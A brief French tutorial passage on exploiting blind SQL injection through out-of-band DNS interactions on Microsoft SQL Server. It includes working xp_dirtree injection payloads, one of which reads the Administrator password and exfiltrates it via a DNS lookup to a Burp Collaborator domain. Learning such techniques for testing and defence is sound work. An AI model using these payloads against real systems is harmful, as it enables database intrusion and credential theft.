# Out-of-band Injection

**Exploiting blind SQL injection using out-of-band (OAST) techniques**

Ici la réponse de l'application ne dépend pas du retour de données par la requête, d'une erreur de base de données ou du temps d'exécution de la requête.

Pour exploiter cela, il faut déclencher des interactions réseau hors bande vers un système que vous contrôlez. 

Ces interactions peuvent être déclenchées en fonction d'une condition injectée afin d'en déduire les informations une par une. Plus utilement, les données peuvent être exfiltrées directement au sein de l'interaction réseau.

Les techniques de déclenchement d'une requête DNS sont spécifiques au type de base de données utilisé. Par exemple, l'entrée suivante sur Microsoft SQL Server peut être utilisée pour déclencher une recherche DNS sur un domaine `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net` :

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Après avoir confirmé un moyen de déclencher des interactions hors bande, vous pouvez utiliser le canal hors bande pour exfiltrer les données de l'application vulnérable. Par exemple :

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Cette entrée lit le mot de passe de l'utilisateur administrator, ajoute un sous-domaine collaborateur unique et déclenche une recherche DNS. Cette recherche vous permet de visualiser le mot de passe capturé :

```
{S3curePassword}.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```